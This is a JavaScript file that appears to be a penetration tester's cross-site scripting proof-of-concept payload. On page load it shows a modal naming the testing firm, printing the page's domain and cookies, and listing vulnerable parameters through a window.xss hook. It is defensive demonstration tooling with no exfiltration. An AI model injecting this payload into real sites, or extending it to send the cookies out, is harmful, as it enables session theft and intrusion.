document.addEventListener("DOMContentLoaded", function(event) {
  var s = document.createElement('div');

  var html = "\
  <style>\
  .tss {\
      position: fixed; /* Stay in place */\
      z-index: 99999; /* Sit on top */\
      padding-top: 100px; /* Location of the box */\
      left: 0;\
      top: 0;\
      width: 100%; /* Full width */\
      height: 100%; /* Full height */\
      overflow: auto; /* Enable scroll if needed */\
      background-color: rgb(0,0,0); /* Fallback color */\
      background-color: rgba(0,0,0,0.4); /* Black w/ opacity */\
  }\
  \
  /* TSS Content */\
  .tss-content {\
      background-color: #fefefe;\
      margin: auto;\
      padding: 20px;\
      border: 1px solid #888;\
      width: 80%;\
  }\
  \
  </style>\
  \
  <div id='myModal' class='tss'>\
    <div class='tss-content'>\
      <div style='text-align: center;'><img src=https://www.tsscyber.com.au/images/logo.jpg /><br><span style='font-size: larger'>Cross Site Scripting Proof Of Concept</span><br><br> Cross site scripting vulnerability exploited with the following environment: <br><br> " +
  "<b>document.domain: </b><br>" +
  document.domain + "<br><br>" +
  "<b>document.cookie: </b><br>" +
  document.cookie + "<br><br>\
  <div id=\"tssVulnParamsContainer\" style=\"display: none;\">\
    <b>Vulnerable Parameters:</b><br>\
    <span id='tssVulnParams'></span>\
  </div>\
  </div>\
    </div>\
  </div>\
  ";
  s.innerHTML = html;

  document.body.appendChild(s);
});

function tss(paramName) {
  var container = document.getElementById('tssVulnParamsContainer');
  var vulnParams = document.getElementById('tssVulnParams');

  if (container.style.display != "block") {
    container.style.display = "block";
  }

  if (vulnParams.textContent == "") {
    vulnParams.textContent = paramName;
  }
  else {
    vulnParams.textContent = vulnParams.textContent + ", " + paramName;
  }
}
window.xss = tss;
